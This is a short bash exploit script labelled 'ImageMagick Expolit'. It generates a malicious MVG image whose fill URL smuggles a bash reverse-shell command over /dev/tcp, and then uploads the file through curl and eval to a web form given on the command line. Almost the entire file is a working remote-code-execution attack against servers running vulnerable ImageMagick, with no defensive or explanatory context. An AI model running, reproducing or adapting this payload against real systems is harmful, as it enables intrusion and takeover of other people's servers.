#!/bin/bash
CURL=`which curl`
if [ "CURL" = "" ];then
	echo "Please install curl tool.";
	exit 1;
fi
exp="exp.png"
EXP="push graphic-context\n\
viewbox 0 0 640 480\n\
fill 'url(https://example.com/image.jpg\"|bash -i >& /dev/tcp/127.0.0.1/2333 0>&1\")'\n\
pop graphic-context"

help(){
	echo -e "\033[0;32mImageMagick Expolit:"
	echo -e "\033[0;32mUsage:	./exp.sh [HOST URL] [POST DATA]"
	echo -e "\033[0;32m	./exp.sh 'http://192.168.1.33/test.php' 'id=1&uname=test'"
	echo -e "\033[0;31mPOC:\n"
	echo -e "\033[0;31m"$EXP"\n"
}

if [[ "$1" = "" && "$2" = "" ]];then
	help
	exit 1;
fi

if [[ "$1" = "help" || "$1" = "-h" || "$1" = "--help" ]];then
	help
	exit 1;
fi

host=`echo "$1" | grep -Pi '^http[s]?://.*'`
echo $host
if [ "$host" = "" ];then 
	help;
	exit 1;
fi

echo -e "\033[0;32mCreating PNG file..."
echo -e $EXP > exp;

# split string and replace
data="-F \"$2\""
data=${data//&/\" -F \"}

#for element in $tmp   
#do  
#    data="${data} ${element}"  
#done 

echo -e "curl -k -H \"Expect:\" $data -F \"files=@$exp\" $host"
$(eval echo -e "curl -k -H \"Expect:\" $data -F \"files=@$exp\" $host")
echo -e "Done\n:)..."
exit 0
